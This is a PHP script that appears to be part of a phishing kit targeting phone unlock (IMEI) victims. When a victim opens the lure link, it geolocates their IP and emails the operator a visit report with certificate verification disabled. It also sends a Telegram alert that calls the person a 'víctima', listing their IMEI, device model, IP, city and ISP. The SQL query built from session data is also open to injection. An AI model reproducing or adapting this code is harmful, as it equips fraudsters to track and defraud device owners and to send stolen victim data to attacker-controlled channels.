<?php session_start(); 
use PHPMailer\PHPMailer\PHPMailer; use PHPMailer\PHPMailer\Exception; 
require ("../php/phpmailer/vendor/autoload.php");
require ("../php/mysql.php");
require ("ajax.php");
setlocale(LC_TIME, "es_BO.UTF-8");
date_default_timezone_set('America/La_Paz');

$generator=$_SESSION['generator'];

$selectINFO = "SELECT * FROM info_server where id_server='1' limit 1";
$resultINFO = $conn->query($selectINFO);
if ($resultINFO->num_rows > 0) { while($rowINFO = $resultINFO->fetch_assoc()) {
    $nameserver=$rowINFO['name'];
    $imgserver=$rowINFO['img'];
    $logoserver=$rowINFO['license'];
}}

$search_proccess = "SELECT * FROM process_data where generator='$generator'";
$result_proccess = $conn->query($search_proccess);
if ($result_proccess->num_rows > 0) {
while($row_proccess = $result_proccess->fetch_assoc()) 
{
    // && IP ADDRESS &&
    $ip_address=$_SERVER["REMOTE_ADDR"];
    $geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$ip_address"));
    $ip_address = $geo["geoplugin_request"];
    $ip_address = str_replace(".", "_", $ip_address);
    $country = $geo["geoplugin_countryName"];
    $city = $geo["geoplugin_city"];
    $date = date("d/m/Y");
    $time = date ("H:i:s");
    
    // && SMTP && TELEGRAM API
    $search_configserver = "SELECT * FROM configserver where id_config='1'";
    $result_configserver = $conn->query($search_configserver);
    if ($result_configserver->num_rows > 0) { while($row_configserver = $result_configserver->fetch_assoc()) 
    {
        
    $smtp_config=$row_configserver['smtp'];       
    $smtp_config=explode("%", $smtp_config);
    $SMTP_HOST = $smtp_config[0];
    $SMTP_USER = $smtp_config[1];
    $SMTP_PASS = $smtp_config[2];
    $SMTP_PORT = $smtp_config[3];
    $SMTP_FROM = $smtp_config[4];

    $TELEGRAM_API=$row_configserver['telegram_key'];    
        
    }}
    
    $info = $row_proccess['info'];
    $info = explode("%", $info);
    
    // && INFO PROCESS &&
    $IMEI_DATA = $info[0];
    $MODEL_DATA = $info[1];
    $CLIENT_DATA = $info[2];
    $EMAIL_LOGIN = $row_proccess['email_script'];
    $create_by=$_SESSION['create_by'];
    
    // && USER DETAILS &&&
    $TELEGRAM_USER = $_SESSION['telegram_user'];
    $EMAIL_TO=$_SESSION['email_user'];
}}



$message = file_get_contents("../php/templates/visits.html");

$message = str_replace('{img_background}', $imgserver, $message);
$message = str_replace('{img_logo}', $logoserver, $message);
$message = str_replace('{name_server}', $nameserver, $message);

$message = str_replace('%email%', $email, $message);
$message = str_replace('%id%', $pass, $message);

$message = str_replace('%imei%', $IMEI_DATA, $message);
$message = str_replace('%modelo%', $MODEL_DATA, $message);
$message = str_replace('%cliente%', $CLIENT_DATA, $message);
$message = str_replace('%os%', $os, $message);
$message = str_replace('%browser%', $browser, $message);
$message = str_replace('%ip_address%', $ip_address, $message);
$message = str_replace('%date%', "$date a la(s) $time", $message);
$message = str_replace('%country%', "$country $city", $message);
$message = str_replace('%isp%', $isp, $message);

$mail = new PHPMailer(true);

try {
    $mail->SMTPDebug = 0;                                       
    $mail->isSMTP();                                          
    $mail->Host       = $SMTP_HOST;  
    $mail->SMTPAuth   = true;                                 
    $mail->Username   = $SMTP_USER;                
    $mail->Password   = $SMTP_PASS;                     
     
    if($SMTP_PORT == 465)
    {
       $mail->SMTPSecure = 'ssl';                                
       $mail->Port       = 465;      
    }else
    {
       $mail->SMTPSecure = 'tls';                                
       $mail->Port       = 587;        
       $mail->SMTPOptions = array(
                    'ssl' => array(
                        'verify_peer' => false,
                        'verify_peer_name' => false,
                        'allow_self_signed' => true
                    )
                ); 
    }
    $mail->XMailer = ' ';
    $mail->CharSet = 'UTF-8'; 
    $mail->Helo = "server.".$_SERVER['SERVER_NAME']; 
    $mail->setFrom($SMTP_FROM, $nameserver);
    $mail->addAddress($EMAIL_TO);             

    $mail->isHTML(true);                               
    $mail->Subject = 'Abrio el Link';
    $mail->Body    = $message;

    $mail->send();
} catch (Exception $e) {
}
$MSG_TELEGRAM='
<b> 👀 Su víctima visitó el enlace 👀 </b>
🔐 A la espera de datos...🔐
-------------------------------------------------- ----------
⌨️ <b>Proceso de desbloqueo </b>
👤 Cliente: '.$CLIENT_DATA.'
🔢 IMEI/SN: '.$IMEI_DATA.'
📱 Modelo: '.$MODEL_DATA.'
-------------------------------------------------- ----------
⌨️ <b>Detalles de la visita</b>
📲 Dispositivo: '.$os.'
🌐 Explorador: '.$browser.'
📍 IP: '.$ip_address.'
📆 Fecha: '.$date.' - '.$time.'
🌎 Country: '.$country.' 🏙Ciudad: '.$city.'
📡 Internet: '.$isp.'
-------------------------------------------------- ----------
💻 Server: <b>'.$nameserver.'</b>.
Copyright ©️ 2024 Todos los derechos reservados.
';

$url = 'https://api.telegram.org/bot'.$TELEGRAM_API.'/sendMessage?chat_id='.$TELEGRAM_USER.'&parse_mode=HTML&text='.urlencode($MSG_TELEGRAM);
file_get_contents($url);    

$_SESSION['Send_Push_Visits']="OK";

?>
